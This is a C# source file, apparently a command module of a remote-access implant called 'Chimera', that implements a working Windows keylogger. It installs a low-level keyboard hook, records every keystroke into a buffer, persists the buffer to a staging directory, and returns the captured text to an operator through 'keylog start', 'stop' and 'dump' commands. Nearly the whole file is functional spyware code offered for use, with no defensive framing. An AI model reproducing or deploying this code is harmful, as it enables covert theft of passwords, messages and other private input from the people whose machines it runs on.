using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Chimera.Commands
{
    // keylog start   — install low-level keyboard hook, log to staging dir
    // keylog stop    — remove hook, return captured keystrokes
    // keylog dump    — return current buffer without stopping
    public static class Keylogger
    {
        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, HookProc fn, IntPtr hMod, uint threadId);
        [DllImport("user32.dll")] static extern bool   UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")] static extern short  GetAsyncKeyState(int vKey);
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN     = 0x0100;

        private static IntPtr   _hook      = IntPtr.Zero;
        private static HookProc _hookProc  = null;   // keep alive
        private static StringBuilder _buf = new StringBuilder();
        private static readonly object _lock = new object();
        private static Thread   _msgThread  = null;
        private static string   _logPath    = null;

        public static string Execute(string param)
        {
            string p = (param ?? "").Trim().ToLower();
            switch (p)
            {
                case "start": return Start();
                case "stop":  return Stop();
                case "dump":  return Dump();
                default:      return "[error] Usage: keylog start | stop | dump";
            }
        }

        private static string Start()
        {
            if (_hook != IntPtr.Zero)
                return "[-] Keylogger already running.";

            Staging.EnsureDir();
            _logPath = Path.Combine(Staging.Dir, "keylog.txt");

            _hookProc = LowLevelKeyboardProc;
            _msgThread = new Thread(() =>
            {
                _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc,
                    GetModuleHandle(null), 0);
                // Pump messages so the hook fires
                MSG msg;
                while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0)
                {
                    TranslateMessage(ref msg);
                    DispatchMessage(ref msg);
                }
            });
            _msgThread.IsBackground = true;
            _msgThread.Start();
            Thread.Sleep(200);

            return _hook != IntPtr.Zero
                ? "[+] Keylogger started. Use 'keylog dump' to read, 'keylog stop' to stop."
                : "[error] SetWindowsHookEx failed: " + Marshal.GetLastWin32Error();
        }

        private static string Stop()
        {
            if (_hook == IntPtr.Zero)
                return "[-] Keylogger not running.";
            UnhookWindowsHookEx(_hook);
            _hook = IntPtr.Zero;
            PostThreadMessage((uint)_msgThread.ManagedThreadId, 0x0012, IntPtr.Zero, IntPtr.Zero); // WM_QUIT
            string captured = Dump();
            lock (_lock) { _buf.Clear(); }
            return "[+] Keylogger stopped.\n" + captured;
        }

        private static string Dump()
        {
            lock (_lock)
            {
                if (_buf.Length == 0) return "[-] No keystrokes captured yet.";
                string data = _buf.ToString();
                // also persist to file
                try { File.AppendAllText(_logPath, data); } catch { }
                _buf.Clear();
                return "[+] Captured keystrokes:\n" + data;
            }
        }

        private static IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vk = Marshal.ReadInt32(lParam);
                string key = VkToString(vk);
                lock (_lock) { _buf.Append(key); }
            }
            return CallNextHookEx(_hook, nCode, wParam, lParam);
        }

        private static string VkToString(int vk)
        {
            if (vk >= 0x41 && vk <= 0x5A) return ((char)vk).ToString().ToLower();
            if (vk >= 0x30 && vk <= 0x39) return ((char)vk).ToString();
            switch (vk)
            {
                case 0x20: return " ";
                case 0x0D: return "\n";
                case 0x08: return "[BS]";
                case 0x09: return "[TAB]";
                case 0xBE: return ".";
                case 0xBC: return ",";
                case 0xBA: return ";";
                case 0xBF: return "/";
                case 0xDB: return "[";
                case 0xDD: return "]";
                case 0xBB: return "=";
                case 0xBD: return "-";
                default:   return "[" + vk.ToString("X2") + "]";
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public System.Drawing.Point pt; }

        [DllImport("user32.dll")] static extern int  GetMessage(out MSG msg, IntPtr hWnd, uint min, uint max);
        [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG msg);
        [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG msg);
        [DllImport("user32.dll")] static extern bool PostThreadMessage(uint tid, uint msg, IntPtr wParam, IntPtr lParam);
    }
}
